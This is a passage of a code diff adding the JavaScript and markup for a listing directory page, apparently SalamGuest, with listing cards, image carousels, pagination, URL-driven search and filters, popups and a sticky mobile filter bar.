+<span class="cardTag">${tag}</span>
+`)
+.join("")}
+
+</div>
+
+<a class="book"
+href="javascript:void(0)"
+onclick="redirectBooking('${item.link}')">
+BOOK ↗
+</a>
+<p class="ratingSmall" style="text-align:center; padding-top: 3px; color:#697CA5;">Prices and availability may vary.</p>
+
+
+</div>
+</div>
+</div>
+
+`;
+
+}).join("");
+
+setTimeout(()=>{
+
+document.querySelectorAll(".carouselWrap")
+.forEach(wrap=>{
+
+const carousel=wrap.querySelector(".carousel");
+
+/* Fix for gray blank image
+ instead of placeholder image
+ for no uploaded images on cards */
+ 
+ const visibleImages = [...carousel.querySelectorAll("img")]
+.filter(img => img.style.display !== "none");
+
+if(visibleImages.length === 0){
+
+carousel.innerHTML = `
+<img src="https://salamguest.github.io/salamguest-directory/images/placeholder.jpg">
+`;
+
+return;
+
+}
+
+const indicators=wrap.querySelector(".carouselIndicators");
+
+const loadedImages = [
+...carousel.querySelectorAll("img")
+].filter(img =>
+img.dataset.loaded === "true" &&
+img.style.display !== "none"
+);
+
+if(loadedImages.length === 0){
+
+carousel.innerHTML = `
+<img src="https://salamguest.github.io/salamguest-directory/images/placeholder.jpg">
+`;
+
+return;
+
+}
+
+const items = loadedImages.length;
+
+if(items<=1){
+
+indicators.innerHTML="";
+return;
+
+}
+
+indicators.innerHTML="";
+
+for(let i=0;i<items;i++){
+
+const dot=document.createElement("span");
+
+if(i===0)dot.classList.add("active");
+
+indicators.appendChild(dot);
+
+}
+
+carousel.addEventListener("scroll",()=>{
+
+const index=Math.round(
+carousel.scrollLeft/carousel.offsetWidth
+);
+
+indicators.querySelectorAll("span")
+.forEach((d,i)=>{
+
+d.classList.toggle("active",i===index);
+
+});
+
+});
+
+});
+
+},1000);
+
+renderPagination(filtered.length);
+
+}
+
+/* PAGINATION */
+
+function renderPagination(total){
+
+const pages=Math.ceil(total/ITEMS_PER_PAGE);
+
+let html="";
+
+for(let i=1;i<=pages;i++){
+
+html+=`
+<button
+class="pageBtn ${i===currentPage?'active':''}"
+onclick="goPage(${i})"
+>
+${i}
+</button>
+`;
+
+}
+
+document.getElementById("pagination").innerHTML=html;
+
+}
+
+function goPage(p){
+
+currentPage=p;
+
+render();
+
+}
+
+/* SEARCH ENTER */
+
+document.getElementById("searchInput")
+.addEventListener("keydown",e=>{
+
+if(e.key==="Enter"){
+render();
+}
+
+});
+
+/* =========================
+AUTO LOAD SEARCH/FILTER FROM URL
+========================= */
+
+function applyURLFilters(){
+
+const params =
+new URLSearchParams(window.location.search);
+
+const search =
+params.get("search");
+
+const filter =
+params.get("filter");
+
+/* AUTO SEARCH */
+
+if(search){
+
+document.getElementById(
+"searchInput"
+).value = search;
+
+}
+
+/* AUTO FILTER TAG */
+
+if(filter){
+
+document.querySelectorAll(".tag")
+.forEach(tag=>{
+
+if(
+tag.innerText.trim()
+.toLowerCase()
+===
+filter.trim()
+.toLowerCase()
+){
+
+tag.classList.add("active");
+
+activeFilters.push(
+tag.parentElement
+.querySelector(".filterTitle")
+.innerText
++
+":"
++
+tag.innerText.trim()
+);
+
+}
+
+});
+
+}
+
+render();
+
+}
+
+load();
+
+
+/* Premium Popup */
+
+function openPremiumPopup(event){
+
+const popup =
+document.getElementById("premiumPopup");
+
+popup.style.display = "block";
+
+popup.style.position = "absolute";
+
+/* popup width */
+const popupWidth = 270;
+const padding = 14;
+
+/* screen width */
+const screenWidth = window.innerWidth;
+
+/* click position */
+let x = event.pageX;
+let y = event.pageY;
+
+/* default position */
+let left = x;
+let top = y + 10;
+
+/* prevent overflow right */
+if(left + popupWidth > screenWidth){
+
+left = screenWidth - popupWidth - padding;
+
+}
+
+/* never too left */
+if(left < padding){
+
+left = padding;
+
+}
+
+popup.style.left = left + "px";
+popup.style.top = top + "px";
+
+}
+
+function closePremiumPopup(){
+
+document.getElementById("premiumPopup")
+.style.display = "none";
+
+}
+
+/* close clicking outside */
+document.addEventListener("click", function(e){
+
+/* PREMIUM POPUP */
+
+const premium =
+document.getElementById("premiumPopup");
+
+if(
+premium &&
+!premium.contains(e.target)
+&&
+!e.target.closest(".locked-chip")
+){
+
+premium.style.display = "none";
+
+}
+
+/* CURRENCY POPUP */
+
+const currency =
+document.getElementById("currencyPopup");
+
+if(
+currency &&
+!currency.contains(e.target)
+&&
+!e.target.closest(".currencyTopBtn")
+&&
+!e.target.closest(".priceCurrency")
+){
+
+currency.style.display = "none";
+
+}
+
+});
+  
+  
+function scrollTopSmooth(){
+
+document.documentElement.scrollTo({
+top:0,
+behavior:"smooth"
+});
+
+document.body.scrollTo({
+top:0,
+behavior:"smooth"
+});
+
+window.scrollTo({
+top:0,
+behavior:"smooth"
+});
+
+}
+
+/* =========================
+BOTTOM STICKY BAR
+========================= */
+
+function updateStickyBar(){
+
+const bar =
+document.getElementById("bottomFilterBar");
+
+const count =
+activeFilters.length;
+
+if(window.innerWidth <= 900){
+
+bar.style.display = "flex";
+
+document.getElementById(
+"filterCount"
+).innerHTML =
+count > 0
+? `⌂ FILTERS • ${count} SELECTED`
+: `⌂ FILTERS`;
+
+}else{
+
+bar.style.display = "none";
+
+}
+
+}
+
+/* =========================
+SEARCH BUTTON (FINAL CLEAN VERSION)
+========================= */
+
+function runStickySearch(){
+
+  const overlay = document.getElementById("searchOverlay");
+  const text = document.getElementById("searchStatusText");
+
+  // show overlay first
+  overlay.style.display = "flex";
+  text.innerHTML = "SEARCHING...";
+
+  // run render AFTER small delay (feels smoother)
+  setTimeout(() => {
+
+    render();
+
+    const count = document.getElementById("cards").children.length;
+
+    if(count > 0){
+      text.innerHTML = `${count} RESULTS FOUND ↓`;
+    } else {
+      text.innerHTML = `NO RESULTS FOUND ↓<br>Try adjusting filters`;
+    }
+
+    // slow premium pause
+    setTimeout(() => {
+
+      overlay.style.display = "none";
+
+      document.getElementById("cards").scrollIntoView({
+        behavior: "smooth",
+        block: "start"
+      });
+
+    }, 1200);
+
+  }, 800);
+}
+ 
+/* PAYHIP IFRAME FLOATING BAR FIX */
+
+function repositionBottomBar(){
+
+  const bar =
+  document.getElementById("bottomFilterBar");
+
+  if(!bar) return;
+
+  const scrollTop =
+  window.scrollY;
+
+  const viewportHeight =
+  window.innerHeight;
+
+  const barHeight =
+  bar.offsetHeight;
+
+  const top =
+  scrollTop +
+  viewportHeight -
+  barHeight -
+  14;
+
+  bar.style.top =
+  top + "px";
+}
+
+/* update while scrolling */
+window.addEventListener(
+"scroll",
+repositionBottomBar
+);
+
+window.addEventListener(
+"resize",
+repositionBottomBar
+);
+
+/* run initially */
+setTimeout(
+repositionBottomBar,
+500
+);
+
+
+</script>
+
+
+<!-- SEARCH POPUP -->
+
+<div id="searchOverlay">
+
+<div class="searchPopup">
+
+<div id="searchStatusText">
+SEARCHING
+</div>
+
+</div>
+
+</div>
+  
+</body>
+</html>
